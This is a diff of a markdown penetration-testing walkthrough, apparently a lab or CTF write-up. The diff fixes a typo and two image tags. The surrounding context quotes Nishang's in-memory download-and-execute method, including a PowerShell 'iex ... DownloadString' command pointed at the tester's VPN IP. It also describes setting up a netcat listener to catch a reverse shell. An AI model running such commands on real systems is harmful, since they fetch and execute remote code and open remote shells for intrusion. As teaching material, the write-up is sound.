@@ -53,7 +53,9 @@ You can see that is possible run commands efectly, then the more obviusly though
 
 Download the RAW file of this module:
 
-A goood approach is execute the reverseShell in memory, like Nishang project describe:
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107417782-f1190000-6ae3-11eb-8bb1-4e254b43e2b2.jpg"></p>
+
+A good approach is execute the reverseShell in memory, like Nishang project describe:
 
 "*Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.*"
 
@@ -71,7 +73,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://<YourVpnIP>:123
 
 Configure a python server in port 1234 and netcat listening in the port 1337:
 
-<p align="center">https://user-images.githubusercontent.com/43796175/107417029-2cff9580-6ae3-11eb-979b-a16af27eb2cc.jpg"></p>
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107417029-2cff9580-6ae3-11eb-979b-a16af27eb2cc.jpg"></p>
 
 Paste the code in the webShell and you recive the reverse connection:
 
